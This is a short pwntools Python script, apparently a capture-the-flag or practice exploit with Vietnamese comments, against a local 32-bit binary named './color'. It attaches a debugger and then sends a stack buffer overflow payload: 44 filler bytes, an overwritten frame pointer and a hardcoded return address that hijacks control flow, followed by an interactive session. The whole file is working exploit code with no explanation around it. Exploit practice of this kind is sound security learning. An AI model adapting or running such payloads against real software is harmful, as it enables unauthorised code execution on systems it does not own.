from pwn import *

r = process('./color')
#p = process('./bof')

# Gắn GDB vào tiến trình
gdb.attach(r, '''
	b *0x804923a
	c
''')

payload = b'a'  * 44
payload += p32(0xffffcef8)
payload += p32(0x080492cb)

r.send(payload)
#print(r.recvall())
r.interactive()
